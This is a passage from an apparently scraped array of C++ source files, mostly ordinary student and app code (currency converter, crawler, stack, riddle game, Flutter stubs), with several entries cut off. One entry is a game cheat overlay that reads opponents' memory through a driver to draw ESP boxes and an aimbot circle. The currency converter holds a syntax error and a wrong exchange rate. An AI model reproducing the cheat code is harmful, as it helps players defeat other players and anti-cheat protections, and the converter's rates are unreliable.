0;\n}\n",
    "#include <iostream>\n#include <map>\n#include <string>\n\nclass CurrencyConverter {\npublic:\n    CurrencyConverter() {\n        // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043a\u0443\u0440\u0441\u043e\u0432 \u0432\u0430\u043b\u044e\u0442\n        exchangeRates[\"USD\"] = 1.0;       // \u0411\u0430\u0437\u043e\u0432\u0430\u044f \u0432\u0430\u043b\u044e\u0442\u0430 (\u0434\u043e\u043b\u043b\u0430\u0440 \u0421\u0428\u0410)\n        exchangeRates[\"EUR\"] = 0.85;      // \u0415\u0432\u0440\u043e\n        exchangeRates[\"JPY\"] = 110.0;     // \u042f\u043f\u043e\u043d\u0441\u043a\u0430\u044f \u0438\u0435\u043d\u0430\n        exchangeRates[\"GBP\"] = 0.75;      // \u0411\u0440\u0438\u0442\u0430\u043d\u0441\u043a\u0438\u0439 \u0444\u0443\u043d\u0442\n        exchangeRates[\"AED\"] = 26.42;\n        exchangeRates[\"VND\"] = 0,004013;\n    }\n\n    double convert(double amount, const std::string& fromCurrency, const std::string& toCurrency) {\n        if (exchangeRates.find(fromCurrency) == exchangeRates.end() || exchangeRates.find(toCurrency) == exchangeRates.end()) {\n            std::cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430: \u043d\u0435\u0432\u0435\u0440\u043d\u0430\u044f \u0432\u0430\u043b\u044e\u0442\u0430.\" << std::endl;\n            return 0.0;\n        }\n        \n        // \u041a\u043e\u043d\u0432\u0435\u0440\u0442\u0430\u0446\u0438\u044f \u0441\u0443\u043c\u043c\u044b \u0432 \u0431\u0430\u0437\u043e\u0432\u0443\u044e \u0432\u0430\u043b\u044e\u0442\u0443 (USD)\n        double amountInUSD = amount / exchangeRates[fromCurrency];\n        // \u041a\u043e\u043d\u0432\u0435\u0440\u0442\u0430\u0446\u0438\u044f \u0438\u0437 \u0431\u0430\u0437\u043e\u0432\u043e\u0439 \u0432\u0430\u043b\u044e\u0442\u044b \u0432 \u0446\u0435\u043b\u0435\u0432\u0443\u044e \u0432\u0430\u043b\u044e\u0442\u0443\n        return amountInUSD * exchangeRates[toCurrency];\n    }\n\n    void displayAvailableCurrencies() {\n        std::cout << \"\u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0432\u0430\u043b\u044e\u0442\u044b:\" << std::endl;\n        for (const auto& pair : exchangeRates) {\n            std::cout << pair.first << std::endl;\n        }\n    }\n\nprivate:\n    std::map<std::string, double> exchangeRates; // \u0421\u043b\u043e\u0432\u0430\u0440\u044c \u0441 \u043a\u0443\u0440\u0441\u0430\u043c\u0438 \u0432\u0430\u043b\u044e\u0442\n};\n\nint main() {\n    CurrencyConverter converter;\n\n    double amount;\n    std::string fromCurrency, toCurrency;\n\n    converter.displayAvailableCurrencies();\n    \n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0443\u043c\u043c\u0443: \";\n    std::cin >> amount;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u043b\u044e\u0442\u0443, \u0438\u0437 \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043a\u043e\u043d\u0432\u0435\u0440\u0442\u0438\u0440\u0443\u0435\u0442\u0435 (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, USD, EUR): \";\n    std::cin >> fromCurrency;\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u043b\u044e\u0442\u0443, \u0432 \u043a\u043e\u0442\u043e\u0440\u0443\u044e \u043a\u043e\u043d\u0432\u0435\u0440\u0442\u0438\u0440\u0443\u0435\u0442\u0435 (\u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, JPY, GBP): \";\n    std::cin >> toCurrency;\n\n    double convertedAmount = converter.convert(amount, fromCurrency, toCurrency);\n    if (convertedAmount != 0.0) {\n        std::cout << amount << \" \" << fromCurrency << \" = \" << convertedAmount << \" \" << toCurrency << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <curl/curl.h>\n#include <fstream>\n#include <regex>\n#include <sstream>\n#include <set>\n#include <algorithm>\n#include <thread>\n#include <mutex>\n#include <chrono>\n#include <atomic>\n#include <queue>\n\n// Function prototypes\nsize_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp);\nvoid crawl(const std::string& url, int maxThreads, int delay, int depth);\nstd::vector<std::string> extractLinks(const std::string& html);\nvoid displayLinks(const std::vector<std::string>& links);\nvoid saveLinks(const std::vector<std::string>& links);\nstd::set<std::string> generatePermutations(const std::string& baseUrl);\nbool isValidURL(const std::string& url);\nbool isAllowedByRobots(const std::string& url);\nbool checkLink(const std::string& url);\nvoid worker(const std::string& targetUrl, std::vector<std::string>& foundLinks, std::mutex& mtx, int delay);\n\nstd::atomic<int> activeThreads(0);\n\nint main(int argc, char* argv[]) {\n    if (argc != 5) {\n        std::cerr << \"Usage: \" << argv[0] << \" <url> <maxThreads> <delay> <depth>\" << std::endl;\n        return 1;\n    }\n\n    std::string url(argv[1]);\n    int maxThreads = std::stoi(argv[2]);\n    int delay = std::stoi(argv[3]);\n    int depth = std::stoi(argv[4]);\n\n    if (!isValidURL(url)) {\n        std::cerr << \"Invalid URL.\" << std::endl;\n        return 1;\n    }\n\n    if (!isAllowedByRobots(url)) {\n        std::cerr << \"Crawling is disallowed by robots.txt.\" << std::endl;\n        return 1;\n    }\n\n    crawl(url, maxThreads, delay, depth);\n\n    return 0;\n}\n\n// Callback function for CURL\nsize_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {\n    ((std::string*)userp)->append((char*)contents, size * nmemb);\n    return size * nmemb;\n}\n\n// Check if crawling is allowed by robots.txt\nbool isAllowedByRobots(const std::string& url) {\n    std::string robotsUrl = url + \"/robots.txt\";\n    CURL* curl;\n    CURLcode res;\n    std::string readBuffer;\n\n    curl = curl_easy_init();\n    if (curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, robotsUrl.c_str());\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n\n    return readBuffer.find(\"Disallow: /\") == std::string::npos;\n}\n\n// Crawl the provided URL and its permutations\nvoid crawl(const std::string& url, int maxThreads, int delay, int depth) {\n    std::set<std::string> urlsToVisit = generatePermutations(url);\n    std::vector<std::string> foundLinks;\n    std::vector<std::thread> threadPool;\n    std::mutex mtx;\n\n    for (const auto& targetUrl : urlsToVisit) {\n        if (activeThreads >= maxThreads) {\n            std::this_thread::yield(); // Wait until a thread is available\n        }\n\n        threadPool.emplace_back(worker, targetUrl, std::ref(foundLinks), std::ref(mtx), delay);\n    }\n\n    for (auto& thread : threadPool) {\n        thread.join();\n    }\n\n    displayLinks(foundLinks);\n\n    char saveChoice;\n    std::cout << \"Do you want to save the links to a file? (y/n): \";\n    std::cin >> saveChoice;\n    if (saveChoice == 'Y' || saveChoice == 'y') {\n        saveLinks(foundLinks);\n    }\n}\n\n// Worker function for crawling\nvoid worker(const std::string& targetUrl, std::vector<std::string>& foundLinks, std::mutex& mtx, int delay) {\n    activeThreads++;\n    CURL* curl;\n    CURLcode res;\n    std::string readBuffer;\n\n    curl = curl_easy_init();\n    if (curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, targetUrl.c_str());\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n        \n        if (res == CURLE_OK) {\n            auto links = extractLinks(readBuffer);\n            std::lock_guard<std::mutex> lock(mtx);\n            for (const auto& link : links) {\n                if (checkLink(link)) {\n                    foundLinks.push_back(link);\n                }\n            }\n        } else {\n            std::cerr << \"Error fetching URL: \" << targetUrl << \" - \" << curl_easy_strerror(res) << std::endl;\n        }\n    }\n\n    std::this_thread::sleep_for(std::chrono::milliseconds(delay)); // Delay between requests\n    activeThreads--;\n}\n\n// Extract links from the HTML content\nstd::vector<std::string> extractLinks(const std::string& html) {\n    std::vector<std::string> links;\n    std::regex linkRegex(R\"((http|https)://[^\\s\"]+)\");\n    std::smatch match;\n    std::string::const_iterator searchStart(html.cbegin());\n\n    while (std::regex_search(searchStart, html.cend(), match, linkRegex)) {\n        links.push_back(match[0]);\n        searchStart = match.suffix().first;\n    }\n\n    return links;\n}\n\n// Check if a link is reachable\nbool checkLink(const std::string& url) {\n    CURL* curl;\n    CURLcode res;\n\n    curl = curl_easy_init();\n    if (curl) {\n        curl_easy_se",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n#include <algorithm>\nusing namespace std;\n\ntemplate<class T>\nclass Stack\n{\n\tpublic:\n\t\tStack(int stackCapacity = 10);\n\t\t~Stack() {delete [] stack;}\n\t\tbool IsEmpty() const;\n\t\tT& Top() const;\n\t\tvoid Push(const T& item);\n\t\tvoid Pop();\n\tprivate:\n\t\tT *stack;\n\t\tint top;\n\t\tint capacity;\n};\n\ntemplate<class T>\nStack<T>::Stack(int stackCapacity):capacity(stackCapacity)\n{\n\tif (capacity < 1)\n\t\tthrow \"Stack capacity must be > 0\";\n\tstack = new T[capacity];\n\ttop = -1;\t\n}\ntemplate<class T>\ninline bool Stack<T>::IsEmpty() const\n\t{return top == -1;}\n\ntemplate<class T>\ninline T& Stack<T>::Top() const\n{\n\tif (IsEmpty())\n\t\tthrow \"Stack is empty\";\n\treturn stack[top];\n}\ntemplate<class T>\nvoid Stack<T>::Push(const T& x)\n{\n\tif (top == capacity - 1)\n\t       throw \"Full!\";\n\tstack[++top] = x;\n}\ntemplate <class T>\nvoid Stack<T>::Pop()\n{\n\tif (IsEmpty())\n\t\tthrow \"Stack is empty. Cannot delete.\";\n\tstack[top--].~T();\n}\n\n\nint main()\n{\n\tStack<int> stack(5);\n\tstack.Push(5);\n\tstack.Push(3);\t\n\tstack.Push(5);\n\tstack.Push(4);\t\n\tcout << stack.Top() << endl;\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "//Include Libraries\n#include<opencv2/opencv.hpp>\n#include<iostream>\n\n// Namespace nullifies the use of cv::function();\nusing namespace std;\nusing namespace cv;\nclass YUVRGBConvert {\npublic:\n\t\tYUVRGBConvert(const char *image, int height, int width): _image((const char *) image), _height(height), _width(width)\n\t\t{\n\t\t\tyuv = Mat(_height*3/2,_width, CV_8UC1);\n\t\t\t_mat_display = Mat(_height, _width, CV_8UC3);\n\t\t\tReadImage();\n\t\t\tConvert();\n\t\t}\n\t\tvoid Display ()\n\t\t{\n\t\t\timshow(\"Image YUV show\", _mat_display);\n\t\t\t// Wait for a keystroke.\n\t\t\twaitKey(0);\n\t\t\t// Destroys all the windows created\n\t\t\tdestroyAllWindows();\n\t\t}\n\nprivate:\n\t\tvoid ReadImage ()\n\t\t{\n\t\t\tFILE *file = fopen(_image, \"r\");\n\t\t\tfread(yuv.data, sizeof(char), _size_image, file);\n\t\t\tfclose(file);\n\t\t}\n\t\tvoid Convert ()\n\t\t{\n\t\t\tcvtColor(yuv, _mat_display,  cv::COLOR_YUV2RGBA_YV12);\n\t\t}\n\t\tint _height;\n\t\tint _width;\n\t\tconst char *_image;\n\t\tMat _mat_display;\n\t\tMat yuv;\n\t\tint _size_image = _height*_width*3/2;\n};\nint main () {\n\tYUVRGBConvert(\"tulips_yuv422_inter_planar_qcif.yuv\",144,176).Display();\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nvoid create(int* arr, int SIZE)\r\n{\r\n    int MIN = -40;\r\n    int MAX = 20;\r\n    for (int i = 0; i < SIZE; i++)\r\n    {\r\n        arr[i] = MIN + rand() % (MAX - MIN + 1);\r\n    }\r\n}\r\n\r\nvoid Print(int* arr, const int SIZE)\r\n{\r\n    for (int i = 0; i < SIZE; i++)\r\n        cout << setw(4) << arr[i];\r\n    cout << endl;\r\n}\r\n\r\nint sum(int* arr, int SIZE)\r\n{\r\n    int sum = 0;\r\n    for (int i = 0; i < SIZE; i++)\r\n    {\r\n        if (arr[i] <= 0 && i % 2 == 0)\r\n            sum += arr[i];\r\n    }\r\n    return sum;\r\n}\r\n\r\nint count(int* arr, int SIZE)\r\n{\r\n    int count = 0;\r\n    for (int i = 0; i < SIZE; i++)\r\n    {\r\n        if (arr[i] <= 0 && i % 2 == 0)\r\n            count++;\r\n    }\r\n    return count;\r\n}\r\n\r\nvoid updateArray(int* arr, int SIZE)\r\n{\r\n    for (int i = 0; i < SIZE; i++)\r\n    {\r\n        if (arr[i] <= 0 && i % 2 == 0)\r\n        {\r\n            arr[i] = 0;\r\n        }\r\n    }\r\n}\r\n\r\n\r\nint main()\r\n{\r\n    srand((unsigned)time(NULL));\r\n\r\n    const int SIZE = 26;\r\n    int arr[SIZE];\r\n    create(arr, SIZE);\r\n    Print(arr, SIZE);\r\n    cout << endl;\r\n    cout << \"sum = \" << sum(arr, SIZE) << endl;\r\n    cout << \"count = \" << count(arr, SIZE) << endl;\r\n    updateArray(arr, SIZE);\r\n    Print(arr, SIZE);\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unistd.h> // Para usar sleep\n#include <algorithm> // Para usar transform (en minusculas)\n#include <fstream> // Para utilizar archivos\n\n\n// Prototipos de las funciones\nvoid pantallaPrincipal();\nbool nivel1();\nbool nivel2();\nbool nivel3();\nbool nivel4();\nbool nivel5();\nvoid barraDeVida(int vidas);\nvoid barra(int respondidas);\nvoid textoReintente();\nvoid jugar();\nvoid hasGanado();\nvoid historial();\n\n\nusing namespace std;\n\nint main() {\n    pantallaPrincipal();\n    return 0;\n}\n\n// Carga de pantalla principal del juego\nvoid pantallaPrincipal() {\n    int tiempo = 0;\n    int carga;\n\n    //animacion de carga\n    do {\n        carga = (tiempo / 3.0) * 100;\n\n        system(\"cls\");\n        cout << \"------------------------------------\" << endl;\n        cout << \"  Cargando por favor espere..... \" << endl;\n        cout << \"------------\" << carga << \"%\" << \"--------------------\" << endl;\n        sleep(1);\n        system(\"cls\");\n        cout << carga << endl;\n        cout << \"------------------------------------\" << endl;\n        cout << \"  Cargando por favor espere......... \" << endl;\n        cout << \"------------\" << carga << \"%\" << \"--------------------\" << endl;\n        sleep(0.5);\n        system(\"cls\");\n        tiempo++;\n    } while (tiempo < 4);\n\n    int opc;\n    do {\n        cout << \"------------------------------------\" << endl;\n        cout << \"        Prision de los Enigmas       \" << endl;\n        cout << \"------------------------------------\" << endl;\n        cout << \"1. Jugar\" << endl;\n        cout << \"2. Historial\" << endl;\n        cout << \"3. Salir\" << endl;\n        cin >> opc;\n\n        switch(opc) {\n            case 1:\n                system(\"cls\");\n                jugar();\n                break;\n            case 2:\n                historial();\n                break;\n            default:\n                opc = 3;\n                break;\n        }\n    } while (opc != 3);\n}\n\n// Funcion para el nivel 1\nbool nivel1() {\n\n    string preguntasNivel1[3] = { \"Soy un numero par, divideme por 2 y el resultado es 18\", \"Soy un numero mayor que 10, si me restas 4, el resultado es 8\",\n                                  \"Soy un numero impar, si me sumas 9 y luego lo divides entre 2, obtienes 17\" };\n\n    int respuestasNivel1[3] = {36, 12, 25};\n    int vidas = 5, respondidas = 0;\n    bool gano = false;\n    int respuesta;\n\n    cout << \"Nivel 1. (Adivinanza matematica)\" << endl;\n    cout << \"---------------------\" << endl;\n\n    for (int i = 0; i < 3 && vidas > 0; ++i) {\n        do {\n            barraDeVida(vidas);\n            barra(respondidas);\n            cout << \"----------Pregunta \" << i+1 << \"---------\" << endl;\n\n            cout << preguntasNivel1[i] << endl;\n            cin >> respuesta;\n            system(\"cls\");\n            if (respuesta != respuestasNivel1[i]) vidas--;\n        } while (respuesta != respuestasNivel1[i] && vidas > 0);\n\n        if (vidas > 0) respondidas++;\n    }\n\n    gano = vidas > 0;\n    return gano;\n}\n\n// Funcion para el nivel 2\nbool nivel2() {\n    string preguntasNivel2[3] = {\n            \"Completa la secuencia: 2, 4, 6, 8, ?\",\n            \"Completa la secuencia: 1, 3, 5, 7, ?\",\n            \"Completa la secuencia: 5, 10, 15, 20, ?\"\n    };\n    int respuestasNivel2[3] = {10, 9, 25};\n    int vidas = 5, respondidas = 3;\n    bool gano = false;\n    int respuesta;\n\n    cout << \"Nivel 2. (Secuencia logica)\" << endl;\n    cout << \"---------------------\" << endl;\n\n    for (int i = 0; i < 3 && vidas > 0; ++i) {\n        do {\n            barraDeVida(vidas);\n            barra(respondidas);\n            cout << \"----------Pregunta \" << i+1 << \"---------\" << endl;\n            cout << preguntasNivel2[i] << endl;\n            cin >> respuesta;\n            system(\"cls\");\n            if (respuesta != respuestasNivel2[i]) vidas--;\n        } while (respuesta != respuestasNivel2[i] && vidas > 0);\n\n        if (vidas > 0) respondidas++;\n    }\n\n    gano = vidas > 0;\n    return gano;\n}\n\n// Funcion para el nivel 3\nbool nivel3() {\n    string preguntasNivel3[3] = {\n            \"Encuentra la palabra oculta: El agua siempre fluye con fuerza.\",\n            \"La monta\u00f1a es muy alta.\",\n            \"La nieve cubre el sol.\"\n    };\n    string respuestasNivel3[3] = {\"agua\", \"montania\", \"nieve\"};\n    int vidas = 5, respondidas = 6;\n    bool gano = false;\n    string respuesta;\n\n    cout << \"Nivel 3. (Palabra Oculta)\" << endl;\n    cout << \"---------------------\" << endl;\n\n    for (int i = 0; i < 3 && vidas > 0; ++i) {\n        do {\n            barraDeVida(vidas);\n            barra(respondidas);\n            cout << \"----------Pregunta \" << i+1 << \"---------\" << endl;\n            cout << preguntasNivel3[i] << endl;\n            cin >> respuesta;\n\n            system(\"cls\");\n            if (respuesta != respuestasNivel3[i]) vidas--;\n        } while (respuesta != respuestasNivel3[i] && vidas > 0);\n\n        if (vidas > 0) respondidas++;\n    }\n\n    gano = vidas > 0;\n    return gano;\n}\n\n// Fun",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatbot_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#ifndef C_RENDER_CPP\r\n#define C_RENDER_CPP\r\n\r\n#include \"../../core/updates/entity.hpp\"\r\n#include \"../../dependencies/imgui/imgui.h\"\r\n#include \"../../core/sdk/utils/n_utils.hpp\"\r\n#include \"../../core/sdk/colors.hpp\"\r\n#include \"../../dependencies/vars/g_vars.hpp\"\r\n#include \"../../core/sdk/drawing.hpp\"\r\n#include \"../overlay/menu/menu.hpp\"\r\n\r\nvoid render::run()\r\n{\r\n    const auto draw_list = ImGui::GetBackgroundDrawList();\r\n\r\n    const colors color_list;\r\n\r\n    auto closest_distance = DBL_MAX;\r\n    auto closest_entity = entity_data(NULL);\r\n\r\n    if (g_vars->misc.watermark.logo || g_vars->misc.watermark.logo_2)\r\n    {\r\n        int x = 5;\r\n        int y = 5;\r\n\r\n        if (g_vars->misc.watermark.logo)\r\n        {\r\n            ImU32 ocean_blue_color = ImGui::GetColorU32(ImVec4(30.0f / 255.0f, 144.0f / 255.0f, 255.0f / 255.0f, 1.0f));\r\n\r\n            drawing.text(draw_list, x, y, ocean_blue_color, hash_str(\"Valiant\"), true);\r\n            ImVec2 text_size = ImGui::CalcTextSize(hash_str(\"Valiant\"));\r\n            x += text_size.x + 5;\r\n        }\r\n\r\n        if (g_vars->misc.watermark.logo_2)\r\n        {\r\n            drawing.text(draw_list, x, y, ImColor(0, 0, 0, 255), (hash_str(\"Private\")), true);\r\n        }\r\n    }\r\n\r\n    if (g_vars->aimbot.display.fov)\r\n    {\r\n        draw_list->AddCircle(ImVec2(math_primitives::s_width_center, math_primitives::s_height_center), g_vars->aimbot.fov, ImColor(255, 255, 255), 2);\r\n    }\r\n\r\n    utils::camera::update();\r\n\r\n    auto rotation_matrix = uengine::create_rotation_matrix(camera_data->rotation);\r\n    const auto aspect_ratio = static_cast<float>(math_primitives::s_width) / math_primitives::s_height;\r\n    auto adjusted_fov = aspect_ratio / (16.0f / 9.0f) * tanf(camera_data->fov * static_cast<float>(m_pi) / 360.0f);\r\n\r\n    for (auto& entity : s_entity_data)\r\n    {\r\n        auto pawn_private = entity.pawn_private;\r\n        auto dying = (km->read<char>(pawn_private + offsets->bIsDying) >> 4) & 1;\r\n        auto downed = (km->read<char>(pawn_private + offsets->bIsDBNO) >> 4) & 1;\r\n        auto visible = utils::other::is_visible(entity.mesh);\r\n\r\n        if (dying) continue;\r\n\r\n        entity.dying = dying;\r\n        entity.downed = downed;\r\n        entity.visible = visible;\r\n\r\n        auto main_colors = downed ? color_list.white_color : (!visible ? color_list.red_color : color_list.green_color); // if downed white, if not visible red, else green\r\n        auto main_color_skeleton = downed ? color_list.white_color : (!visible ? color_list.red_color : color_list.green_color); // if downed white, if not visible red, else green\r\n\r\n        std::pair<uintptr_t, uengine::ftransform> bone_data = utils::bone::get_bone_data(entity.mesh);\r\n\r\n        uintptr_t bone_array = bone_data.first;\r\n        uengine::ftransform component_to_world = bone_data.second;\r\n\r\n        uengine::ftransform head_bone = utils::bone::get_bone_transform(bone_array, 110);\r\n\r\n        uengine::ftransform neck_bone = utils::bone::get_bone_transform(bone_array, 68);\r\n\r\n        uengine::ftransform root_bone = utils::bone::get_bone_transform(bone_array, 0);\r\n\r\n        math_primitives::fvector head_bone_position = utils::bone::process_bone_transform(head_bone, component_to_world);\r\n\r\n        math_primitives::fvector neck_bone_position = utils::bone::process_bone_transform(neck_bone, component_to_world);\r\n\r\n        math_primitives::fvector root_bone_position = utils::bone::process_bone_transform(root_bone, component_to_world);\r\n\r\n        auto distance = static_cast<int>(camera_data->location.distance(head_bone_position) / 100.f);\r\n\r\n        if (distance > g_vars->visuals.max_distance) continue;\r\n\r\n        math_primitives::fvector2d head_w2s = utils::screen::world_to_screen(head_bone_position, rotation_matrix, adjusted_fov);\r\n\r\n        auto head_box = utils::screen::world_to_screen(math_primitives::fvector(head_bone_position.x, head_bone_position.y, head_bone_position.z + 15), rotation_matrix, adjusted_fov);\r\n\r\n        math_primitives::fvector2d root_w2s = utils::screen::world_to_screen(root_bone_position, rotation_matrix, adjusted_fov);\r\n\r\n        auto box_height = abs(head_box.y - root_w2s.y);\r\n        auto box_width = box_height * 0.40;\r\n\r\n        if (g_vars->visuals.box)\r\n        {\r\n\t\t\tdrawing.box_2d(draw_list, head_box.x - (box_width / 2), head_box.y, box_width, box_height, ImColor(main_colors), g_vars->visuals.box_thickness);\r\n        }\r\n\r\n        if (g_vars->visuals.distance)\r\n        {\r\n            std::string text = (hash_str(\"[\")) + std::to_string(int(distance)) + (hash_str(\"m]\"));\r\n            ImVec2 text_size = ImGui::CalcTextSize(text.c_str());\r\n            drawing.text(draw_list, root_w2s.x - text_size.x / 2, root_w2s.y, color_list.white_color, text.c_str(), false);\r\n        }\r\n\r\n        if (g_vars->visuals.weapon)\r\n        {\r\n            auto current_weapon = km->read<uintptr_t>(entity.pawn_private + 0xA68);\r\n            std::string weapon = utils::weapon::get_weapon_name(current_weapon);\r\n\r\n            if (g_vars->visuals.a",
    "#include <glad/glad.h>\r\n#include <GLFW/glfw3.h>\r\n#include <iostream>\r\n\r\n#include \"glm/glm.hpp\"\r\n#include \"glm/gtc/matrix_transform.hpp\"\r\n#include \"glm/gtc/type_ptr.hpp\"\r\n\r\n//Credit to: https://learnopengl.com/ for these two .h files and brickwall.jpg, brickwall_normal.jpg\r\n#include \"Shader.h\"\r\n#include \"Camera.h\"\r\n\r\n#define STB_IMAGE_IMPLEMENTATION\r\n#include \"stb_image.h\"\r\n\r\n//settings\r\nint SCR_WIDTH{ 800 };\r\nint SCR_HEIGHT{ 600 };\r\n\r\n//screen\r\nCamera camera(glm::vec3(0.f, 0.f, 3.f));\r\nfloat lastX{ SCR_WIDTH / 2.f };\r\nfloat lastY{ SCR_HEIGHT / 2.f };\r\nbool firstMouse{ true };\r\n\r\n//deltaTime\r\nfloat deltaTime{ 0.f };\r\nfloat lastFrame{ 0.f };\r\n\r\nvoid framebuffer_scall(GLFWwindow* window, int w, int h) {\r\n    glViewport(0, 0, w, h);\r\n    SCR_WIDTH = w;\r\n    SCR_HEIGHT = h;\r\n}\r\n\r\nbool moveScene{ true };\r\nbool doNormalMap{ true };\r\nbool isTPressed{ false };\r\nbool isNPressed{ false };\r\nvoid processInput(GLFWwindow* window) {\r\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS) {\r\n        glfwSetWindowShouldClose(window, true);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_W) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(FORWARD, deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_A) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(LEFT, deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_S) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(BACKWARD, deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_D) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(RIGHT, deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_T) == GLFW_PRESS && !isTPressed) {\r\n        moveScene = !moveScene;\r\n        isTPressed = true;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_T) == GLFW_RELEASE) {\r\n        isTPressed = false;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_SPACE) == GLFW_PRESS && !isNPressed) {\r\n        doNormalMap = !doNormalMap;\r\n        isNPressed = true;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_SPACE) == GLFW_RELEASE) {\r\n        isNPressed = false;\r\n    }\r\n}\r\n\r\nvoid cursor_scall(GLFWwindow* window, double xpos, double ypos) {\r\n    float XPOS = static_cast<float>(xpos);\r\n    float YPOS = static_cast<float>(ypos);\r\n\r\n    if (firstMouse) {\r\n        firstMouse = false;\r\n        lastX = XPOS;\r\n        lastY = YPOS;\r\n    }\r\n    float xoffset = XPOS - lastX;\r\n    float yoffset = lastY - YPOS; //YPOS is negative, because yaxis is reversed\r\n\r\n    lastX = XPOS;\r\n    lastY = YPOS;\r\n    camera.ProcessMouseMovement(xoffset, yoffset);\r\n}\r\n\r\nvoid scroll_scall(GLFWwindow* window, double xpos, double ypos) {\r\n    camera.ProcessMouseScroll(static_cast<float>(ypos));\r\n}\r\n\r\nunsigned int loadTexture(std::string filename, GLenum internalFormat = 0) {\r\n    unsigned int textureID;\r\n    int width, height, nrChannels;\r\n    glGenTextures(1, &textureID);\r\n    glBindTexture(GL_TEXTURE_2D, textureID);\r\n\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\r\n\r\n    unsigned char* data = stbi_load(filename.c_str(), &width, &height, &nrChannels, 0);\r\n    if (data) {\r\n        GLenum format = GL_RGB;\r\n   